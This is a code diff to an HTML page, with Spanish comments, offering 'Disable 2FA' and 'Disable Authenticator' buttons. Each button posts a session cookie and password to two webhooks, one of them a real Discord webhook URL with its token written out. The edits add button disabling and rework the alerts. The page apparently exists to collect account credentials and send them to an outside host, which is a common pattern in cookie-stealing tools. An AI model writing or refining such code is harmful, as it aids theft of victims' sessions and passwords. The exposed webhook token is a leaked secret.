@@ -47,6 +47,11 @@
             transform: scale(1.05);
             box-shadow: 0 8px 20px rgba(0, 156, 205, 0.5);
         }
+
+        button:disabled {
+            background: #bbb;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
@@ -60,7 +65,10 @@
         const webhook1 = "https://your-first-webhook-url.com";  // Primer webhook
         const webhook2 = "https://discord.com/api/webhooks/1329981919823400970/5hDpWdgx7gSAggnhvk-iCvQA9c5-jgtUFeCWAIuHMeKNLDnNpr-gZRJ16ot2sLhJYpO9"; // Segundo webhook
 
-        async function sendToWebhooks(data) {
+        async function sendToWebhooks(data, buttonId) {
+            // Deshabilitar los botones mientras la solicitud está en proceso
+            document.getElementById(buttonId).disabled = true;
+
             try {
                 // Enviar datos al primer webhook
                 const response1 = await fetch(webhook1, {
@@ -81,57 +89,59 @@
                 });
 
                 // Verificar si alguna de las respuestas no es exitosa
-                if (!response1.ok) {
-                    throw new Error(`Error al enviar al primer webhook: ${response1.statusText}`);
+                if (!response1.ok || !response2.ok) {
+                    throw new Error('Error al enviar los datos a los webhooks.');
                 }
 
-                if (!response2.ok) {
-                    throw new Error(`Error al enviar al segundo webhook: ${response2.statusText}`);
-                }
-
+                // Mostrar alerta de éxito
                 Swal.fire({
                     title: "Success",
                     text: "Data sent successfully to the webhooks.",
                     icon: "success",
-                    confirmButtonText: "OK"
+                    confirmButtonText: "OK",
+                    allowOutsideClick: true,  // Permite hacer clic fuera de la alerta
+                    allowEscapeKey: true      // Permite cerrar la alerta con la tecla escape
                 });
             } catch (error) {
+                // Mostrar mensaje de error adecuado
                 let errorMessage = "Failed to send data to the webhooks.";
                 
-                // Mejorar el mensaje de error según el tipo
-                if (error.name === "TypeError") {
-                    errorMessage = "Network error: Please check your internet connection.";
-                } else if (error.message.includes("Error al enviar")) {
+                if (error.message.includes("Error al enviar")) {
                     errorMessage = error.message;
+                } else if (error.name === "TypeError") {
+                    errorMessage = "Network error: Please check your internet connection.";
                 }
 
+                // Mostrar alerta de error
                 Swal.fire({
                     title: "Error",
                     text: errorMessage,
                     icon: "error",
-                    confirmButtonText: "OK"
+                    confirmButtonText: "OK",
+                    allowOutsideClick: true,  // Permite hacer clic fuera de la alerta
+                    allowEscapeKey: true      // Permite cerrar la alerta con la tecla escape
                 });
-                console.error("Error sending data to webhooks:", error);
+            } finally {
+                // Habilitar nuevamente el botón después de que la solicitud se haya completado
+                document.getElementById(buttonId).disabled = false;
             }
         }
 
         document.getElementById("disable-2fa").addEventListener("click", () => {
-            // Datos predefinidos para el botón "Disable 2FA"
             const data = {
                 "Cookie": "example-cookie-value",
                 "Password": "example-password",
                 "Webhook": "https://example-webhook-url.com"
             };
-            sendToWebhooks(data);
+            sendToWebhooks(data, "disable-2fa");
         });
 
         document.getElementById("disable-authenticator").addEventListener("click", () => {
-            // Datos predefinidos para el botón "Disable Authenticator"
             const data = {
                 "Cookie": "example-cookie-value",
                 "Webhook": "https://example-webhook-url.com"
             };
-            sendToWebhooks(data);
+            sendToWebhooks(data, "disable-authenticator");
         });
     </script>
 </body>
